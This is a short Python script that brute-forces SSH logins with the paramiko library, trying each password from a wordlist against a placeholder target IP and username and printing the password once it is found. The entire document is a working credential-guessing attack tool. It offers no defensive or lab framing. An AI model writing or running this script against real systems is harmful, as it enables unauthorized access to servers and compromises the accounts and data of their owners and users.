import paramiko

def ssh_bruteforce(target_ip, username, password_list_file):
    with open(password_list_file, 'r') as file:
        passwords = file.readlines()

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in passwords:
        password = password.strip()  # Remove any trailing whitespace
        try:
            client.connect(target_ip, username=username, password=password, timeout=5)
            print(f"[+] Found password: {password}")
            return password
        except paramiko.AuthenticationException:
            print(f"[-] Failed password: {password}")
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    print("[!] Brute-force finished. If no password was found, you might want to try a different list.")
    return None

if __name__ == "__main__":
    target = "your_target_ip"
    user = "your_username"
    password_file = "passwords.txt"

    ssh_bruteforce(target, user, password_file)
